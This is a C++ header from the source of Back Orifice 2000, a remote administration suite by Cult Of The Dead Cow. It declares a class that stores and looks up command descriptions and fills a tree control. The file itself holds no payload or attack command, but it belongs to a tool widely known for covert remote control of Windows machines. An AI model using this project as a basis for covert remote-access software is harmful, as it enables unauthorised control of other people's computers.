/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// BOCmdDescList.h: interface for the CBOCmdDescList class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_BOCMDDESCLIST_H__AA5D7642_AB9E_11D2_ADC4_0000F8084273__INCLUDED_)
#define AFX_BOCMDDESCLIST_H__AA5D7642_AB9E_11D2_ADC4_0000F8084273__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define MAX_BO_COMMANDS 1024

class CBOCmdDescList  
{
private:
	typedef struct {
		BOOL bNative;
		char svFolderName[32];
		char svCommName[32];
		char svArgDesc1[32];
		char svArgDesc2[32];
		char svArgDesc3[32];
	} BO_COMMAND_DESC; 

	BO_COMMAND_DESC m_descList[MAX_BO_COMMANDS];

public:
	CBOCmdDescList();
	virtual ~CBOCmdDescList();
	void SetNativeCommands(void);
	void SetDesc(int nCommand);
	void SetDesc(int nCommand, char *szFolderName, char *szCommName, char *szArgDesc1, char *szArgDesc2, char *szArgDesc3, BOOL bNative=FALSE);
	int  GetCommand(char *szFolderName, char *szCommName);
	void FillTreeCtrl(CTreeCtrl *pTree);
	char *GetFolderName(int nCommand);
	char *GetCommName(int nCommand);
	char *GetArgDesc1(int nCommand);
	char *GetArgDesc2(int nCommand);
	char *GetArgDesc3(int nCommand);
};

#endif // !defined(AFX_BOCMDDESCLIST_H__AA5D7642_AB9E_11D2_ADC4_0000F8084273__INCLUDED_)
